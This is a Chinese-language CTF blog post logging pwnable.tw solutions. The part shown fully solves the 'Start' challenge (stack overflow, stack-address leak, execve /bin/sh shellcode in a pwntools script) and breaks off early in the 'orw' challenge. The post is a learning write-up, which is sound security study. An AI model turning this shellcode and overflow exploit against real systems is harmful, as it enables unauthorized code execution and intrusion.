<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Pwn tw 刷题记录 | Vergissmeinnicht</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="CTF,Pwn">
    <meta name="description" content="简介最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。 摸了好久，从Xman刚回来，继续ing">
<meta name="keywords" content="CTF,Pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn tw 刷题记录">
<meta property="og:url" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/index.html">
<meta property="og:site_name" content="Vergissmeinnicht">
<meta property="og:description" content="简介最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。 摸了好久，从Xman刚回来，继续ing">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw6.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/orw7.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc6.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc7.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/calc8.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/3x170.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/3x171.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/3x172.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/3x173.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/dubblesort6.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/hacknote0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/hacknote1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/hacknote2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/hacknote3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/hacknote4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/silver_bullet0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/silver_bullet1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/silver_bullet2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/silver_bullet4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/silver_bullet5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore6.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore7.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore8.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/applestore9.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear0.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear1.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear2.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear6.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear3.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear4.jpg">
<meta property="og:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/tcache_tear5.jpg">
<meta property="og:updated_time" content="2020-01-21T06:25:40.157Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pwn tw 刷题记录">
<meta name="twitter:description" content="简介最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。 摸了好久，从Xman刚回来，继续ing">
<meta name="twitter:image" content="http://yoursite.com/2019/09/13/Pwn-tw-刷题记录/start0.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="Vergissmeinnicht" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    

</head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.png">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Ver</h5>
          <a href="mailto:verhan@163.com" title="verhan@163.com" class="mail">verhan@163.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/">
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives">
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags">
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories">
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about">
                <i class="icon icon-lg icon-address-card"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Pwn tw 刷题记录</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Pwn tw 刷题记录</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-09-13T02:07:31.000Z" itemprop="datePublished" class="page-time">
  2019-09-13
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Pwn/">Pwn</a></li></ul>

            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">简介</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Start"><span class="post-toc-number">2.</span> <span class="post-toc-text">Start</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#orw"><span class="post-toc-number">3.</span> <span class="post-toc-text">orw</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-1"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-1"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-1"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-1"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#calc"><span class="post-toc-number">4.</span> <span class="post-toc-text">calc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-2"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-2"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-2"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-2"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#3x17"><span class="post-toc-number">5.</span> <span class="post-toc-text">3x17</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-3"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-3"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-3"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-3"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#dubblesort"><span class="post-toc-number">6.</span> <span class="post-toc-text">dubblesort</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-4"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-4"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-4"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-4"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#hacknote"><span class="post-toc-number">7.</span> <span class="post-toc-text">hacknote</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-5"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-5"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-5"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-5"><span class="post-toc-number">7.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Silver-Bullet"><span class="post-toc-number">8.</span> <span class="post-toc-text">Silver Bullet</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-6"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-6"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-6"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-6"><span class="post-toc-number">8.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#applestore"><span class="post-toc-number">9.</span> <span class="post-toc-text">applestore</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-7"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-7"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-7"><span class="post-toc-number">9.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-7"><span class="post-toc-number">9.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Tcache-Tear"><span class="post-toc-number">10.</span> <span class="post-toc-text">Tcache Tear</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目描述-8"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基本信息-8"><span class="post-toc-number">10.2.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题思路-8"><span class="post-toc-number">10.3.</span> <span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解题脚本-8"><span class="post-toc-number">10.4.</span> <span class="post-toc-text">解题脚本</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Pwn-tw-刷题记录" class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Pwn tw 刷题记录</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-09-13 10:07:31" datetime="2019-09-13T02:07:31.000Z" itemprop="datePublished">2019-09-13</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Pwn/">Pwn</a></li></ul>



            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style="display:none">
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><del>最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。</del></p>
<p>摸了好久，从Xman刚回来，继续ing</p>
<a id="more"></a>

<hr>
<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Just a start.<br>nc chall.pwnable.tw 10000</p>
</blockquote>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/start0.jpg" alt="start0" title="">
                </div>
                <div class="image-caption">start0</div>
            </figure></div>

<p>checksec一下，没有任何保护</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/start2.jpg" alt="start2" title="">
                </div>
                <div class="image-caption">start2</div>
            </figure></div>

<p>ida打开如下：</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/start1.jpg" alt="start1" title="">
                </div>
                <div class="image-caption">start1</div>
            </figure></div>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>F5出来之后的东西有点奇怪，所以直接看汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    3A465443h</span><br><span class="line">push    20656874h</span><br><span class="line">push    20747261h</span><br><span class="line">push    74732073h</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line">_start endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>

<p>程序逻辑大概就是首先将需要的参数传入寄存器，然后执行系统调用，根据<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">这里</a>的查找，可以确定第一个系统调用为sys_write</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/start3.jpg" alt="start3" title="">
                </div>
                <div class="image-caption">start3</div>
            </figure></div>

<p>其中eax为系统调用参数，0x4便是sys_write。ebx为fd，这里是1。ecx为buf，这里为esp。edx为size，这里为0x14</p>
<p>这里就是将<code>Let&#39;s start the CTF:</code>这句话压入栈，然后通过sys_write打印到bash中</p>
<p>之后程序又将ebx置零，然后将edx改为0x3c，eax改为0x3。这里也就是代表捕获bash中的输入并且覆盖到esp上面去</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/start4.jpg" alt="start4" title="">
                </div>
                <div class="image-caption">start4</div>
            </figure></div>

<p>经过gdb调试，我发现也的确是这样的</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/start5.jpg" alt="start5" title="">
                </div>
                <div class="image-caption">start5</div>
            </figure></div>

<p>其中<code>0xffffcdc8</code>处也就是返回地址</p>
<p>那么这便是简单的栈溢出，由于没有开启nx，我们可以将shellcode写入栈上，然后控制返回地址到shellcode即可，其中偏移为20</p>
<p>但是由于我们的shellcode普遍大于20，那么我们写只能写在返回地址之后，shellcode可以在<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">这里</a>寻找</p>
<p>不过这里还有个问题便是如何获取栈地址，我注意到汇编代码中有这么一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, esp        ; addr</span><br></pre></td></tr></table></figure>

<p>在retn的时候如果我们控制返回地址到这里，那么接下来程序便会将此时的esp打印出来，这样我们便可以获得当前的esp地址，然后便可以算出shellcode的位置</p>
<p>PS:这里需要注意不能用<code>sendline</code>函数，因为sendline会把当前的esp中的内容覆盖掉，这样就获取不了esp的值了</p>
<h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./start'</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">20</span></span><br><span class="line">ru(<span class="string">'Let\'s start the CTF:'</span>)</span><br><span class="line">write_addr = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset + p32(write_addr)</span><br><span class="line">sd(payload)</span><br><span class="line">esp_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">'[+]Esp_addr: '</span>+hex(esp_addr))</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'\n'</span>.join([</span><br><span class="line">    <span class="string">'push %d'</span> % u32(<span class="string">'/sh\0'</span>),</span><br><span class="line">    <span class="string">'push %d'</span> % u32(<span class="string">'/bin'</span>),</span><br><span class="line">    <span class="string">'xor edx, edx'</span>,</span><br><span class="line">    <span class="string">'xor ecx, ecx'</span>,</span><br><span class="line">    <span class="string">'mov ebx, esp'</span>,</span><br><span class="line">    <span class="string">'mov eax, 0xb'</span>,</span><br><span class="line">    <span class="string">'int 0x80'</span>,</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*offset + p32(esp_addr+<span class="number">20</span>) + shellcode</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Read the flag from /home/orw/flag.<br>Only open read write syscall are allowed to use.<br>nc chall.pwnable.tw 10001</p>
</blockquote>
<h2 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw0.jpg" alt="orw0" title="">
                </div>
                <div class="image-caption">orw0</div>
            </figure></div>

<p>checksec一下，开启了Canary和Part relro</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw1.jpg" alt="orw1" title="">
                </div>
                <div class="image-caption">orw1</div>
            </figure></div>

<p>ida打开如下：</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw2.jpg" alt="orw2" title="">
                </div>
                <div class="image-caption">orw2</div>
            </figure></div>

<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>正如题目表述的那样，我们只能使用<code>open/read/write</code>三个syscall，限制他们的也正是<code>orw_seccomp</code>函数</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
